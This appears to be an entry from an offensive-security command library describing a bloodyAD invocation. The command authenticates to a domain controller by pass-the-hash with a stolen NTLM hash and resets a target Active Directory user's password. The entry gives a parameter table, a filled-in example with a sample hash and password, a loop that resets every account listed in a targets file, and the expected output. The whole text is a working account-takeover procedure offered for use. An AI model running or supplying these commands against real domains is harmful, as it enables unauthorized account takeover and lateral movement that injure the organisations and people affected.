---
type: command
executor: bash
data: >-
  bloodyAD.py --host $_DC_IP -d $_DOMAIN -u $_ATTACKER_USER -p
  :$_ATTACKER_NTLM_HASH changePassword $_TARGET_USER $_NEW_PASSWORD
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - active-directory
  - password-reset
  - pass-the-hash
verified: true
validated: true
---

# bloodyad-change-password-pth

## Command

```bash
bloodyAD.py --host $_DC_IP -d $_DOMAIN -u $_ATTACKER_USER -p :$_ATTACKER_NTLM_HASH changePassword $_TARGET_USER $_NEW_PASSWORD
```

## Description

This command uses the bloodyAD Python tool to perform a password reset on a target AD user by authenticating with a pass-the-hash (PtH) of an account that has reset rights (gained via ACL abuse). It targets the SAMR interface on the specified DC. Ideal for scenarios where only hashes are available from prior dumps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DC_IP | IP address of the Domain Controller | Yes |
| $_DOMAIN | Target domain name (e.g., corp.local) | Yes |
| $_ATTACKER_USER | Username associated with the NTLM hash | Yes |
| $_ATTACKER_NTLM_HASH | NTLM hash in format (e.g., B4B9B02E6F09A9BD760F388B67351E2B) | Yes |
| $_TARGET_USER | Username of the target account to reset | Yes |
| $_NEW_PASSWORD | New password to set for the target user | Yes |
| --host | Specifies the DC IP for connection | Built-in |
| -d | Specifies the domain | Built-in |
| -u | Specifies the username | Built-in |
| -p | Specifies password or hash (prefix with : for hash) | Built-in |
| changePassword | Subcommand to reset password | Built-in |

## Examples

### Basic Usage

```bash
bloodyAD.py --host 10.0.0.10 -d CORP -u svcacct -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword jdoe NewP@ss123!
```

### Advanced Usage

In a script for multiple targets:

```bash
for user in $(cat targets.txt); do
  bloodyAD.py --host $_DC_IP -d $_DOMAIN -u $_ATTACKER_USER -p :$_ATTACKER_NTLM_HASH changePassword $user $_NEW_PASSWORD
  echo "Reset $user"
done
```

## Expected Output

Successful execution:
```
[+] Password changed successfully for user: jdoe
```

Failure (invalid hash):
```
[-] Authentication failed
```

## Related

- [[procedures/Abuse-AD-ACLs-to-Reset-User-Password]]
- [[tools/bloodyAD]]
